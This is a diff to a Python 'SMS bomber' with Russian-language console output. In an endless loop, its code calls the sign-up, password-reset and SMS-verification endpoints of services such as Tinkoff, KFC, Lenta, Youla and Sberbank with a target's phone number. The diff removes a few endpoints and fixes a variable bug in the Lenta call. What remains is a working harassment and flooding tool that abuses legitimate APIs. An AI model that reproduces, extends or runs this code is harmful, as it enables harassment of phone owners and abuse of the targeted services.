@@ -80,13 +80,6 @@ while True:
         print(Fore.RED + '[-] [Tinder] Не отправлено!' + Style.RESET_ALL)
 
     try:
-        requests.post('https://app.karusel.ru/api/v1/phone/',
-                      data={'phone': _phone}, headers={}, timeout=2)
-        print(Fore.GREEN + '[+] Karusel отправлено!' + Style.RESET_ALL)
-    except:
-        print(Fore.RED + '[-] [Karusel] Не отправлено!' + Style.RESET_ALL)
-
-    try:
         requests.post('https://api.tinkoff.ru/v1/sign_up',
                       data={'phone': '+'+_phone}, headers={}, timeout=2)
         print(Fore.GREEN + '[+] Tinkoff отправлено!' + Style.RESET_ALL)
@@ -106,13 +99,6 @@ while True:
         print(Fore.GREEN + '[+] Youla отправлено!' + Style.RESET_ALL)
     except:
         print(Fore.RED + '[-] [Youla] Не отправлено!' + Style.RESET_ALL)
-
-    try:
-        requests.post('https://pizzahut.ru/account/password-reset', data={
-                      'reset_by': 'phone', 'action_id': 'pass-recovery', 'phone': _phonePizzahut, '_token': '*'}, timeout=2)
-        print(Fore.GREEN + '[+] PizzaHut отправлено!' + Style.RESET_ALL)
-    except:
-        print(Fore.RED + '[-] [PizzaHut] Не отправлено!' + Style.RESET_ALL)
 
     try:
         requests.post('https://www.rabota.ru/remind',
@@ -177,13 +163,6 @@ while True:
         print(Fore.RED + '[-] [alpari] Не отправлено!' + Style.RESET_ALL)
 
     try:
-        requests.post(
-            'https://lk.invitro.ru/lk2/lka/patient/refreshCode', data={'phone': _phone}, timeout=2)
-        print(Fore.GREEN + '[+] Invitro отправлено!' + Style.RESET_ALL)
-    except:
-        print(Fore.RED + '[-] [Invitro] Не отправлено!' + Style.RESET_ALL)
-
-    try:
         requests.post('https://online.sbis.ru/reg/service/', json={
                       'jsonrpc': '2.0', 'protocol': '5', 'method': 'Пользователь.ЗаявкаНаФизика', 'params': {'phone': _phone}, 'id': '1'}, timeout=2)
         print(Fore.GREEN + '[+] Sberbank отправлено!' + Style.RESET_ALL)
@@ -203,13 +182,6 @@ while True:
         print(Fore.GREEN + '[+] Beltelcom отправлено!' + Style.RESET_ALL)
     except:
         print(Fore.RED + '[-] [Beltelcom] Не отправлено!' + Style.RESET_ALL)
-
-    try:
-        requests.post('https://app.karusel.ru/api/v1/phone/',
-                      data={'phone': _phone}, timeout=2)
-        print(Fore.GREEN + '[+] Karusel отправлено!' + Style.RESET_ALL)
-    except:
-        print(Fore.RED + '[-] [Karusel] Не отправлено!' + Style.RESET_ALL)
 
     try:
         requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms',
@@ -268,13 +240,6 @@ while True:
         print(Fore.RED + '[-] [InDriver] Не отправлено!' + Style.RESET_ALL)
 
     try:
-        requests.post("https://lk.invitro.ru/sp/mobileApi/createUserByPassword",
-                      data={"password": password, "application": "lkp", "login": "+" + _phone}, timeout=2)
-        print(Fore.GREEN + '[+] Invitro отправлено!' + Style.RESET_ALL)
-    except:
-        print(Fore.RED + '[-] [Invitro] Не отправлено!' + Style.RESET_ALL)
-
-    try:
         requests.post(
             'https://ube.pmsm.org.ru/esb/iqos-phone/validate', json={"phone": _phone}, timeout=2)
         print(Fore.GREEN + '[+] Pmsm отправлено!' + Style.RESET_ALL)
@@ -290,7 +255,7 @@ while True:
 
     try:
         requests.post('https://lenta.com/api/v1/authentication/requestValidationCode',
-                      json={'phone': '+' + self.formatted_phone}, timeout=2)
+                      json={'phone': '+' + _phone}, timeout=2)
         print(Fore.GREEN + '[+] Lenta отправлено!' + Style.RESET_ALL)
     except:
         print(Fore.RED + '[-] [Lenta] Не отправлено!' + Style.RESET_ALL)
